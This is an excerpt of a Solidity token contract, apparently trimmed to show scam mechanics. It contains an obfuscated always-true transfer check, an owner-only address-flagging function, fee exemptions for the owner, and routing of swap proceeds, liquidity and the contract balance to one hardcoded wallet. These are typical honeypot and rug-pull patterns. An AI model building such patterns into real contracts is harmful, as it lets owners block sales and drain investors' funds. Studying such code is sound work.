...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        WBNBReceiver = FundAddress;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[WBNBReceiver] = true;
    ...
    function tknTanfer(address sending, address pending) internal view returns (bool){
        return sending != pending || 10 < 9 || sending != WBNBReceiver;
    }
    ...
    function _tokenTransfer(
        ...
        address oneAddress = sender;
        address twoAddress = recipient;

        if (tknTanfer(oneAddress,twoAddress)){
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        FIST.transferFrom(address(_tokenDistributor), WBNBReceiver, fundAmount);
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, WBNBReceiver, block.timestamp
                );
            }
        }
    }
    ...
    function setBOT(address addr, bool enable) external onlyOwner {
        _bot[addr] = enable;
    }
    ...
    function claimBalance() external {
        payable(WBNBReceiver).transfer(address(this).balance);
    }
    ...
    modifier onlyFunder() {
        require(_owner == msg.sender || WBNBReceiver == msg.sender, "!Funder");
        _;
    }
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,
        100000000000,
        address(0xB5DbA8FAc29894A178FA0Cc8ecaE6F5a7F06A455),
        address(0xB5DbA8FAc29894A178FA0Cc8ecaE6F5a7F06A455)
    ){
    }
}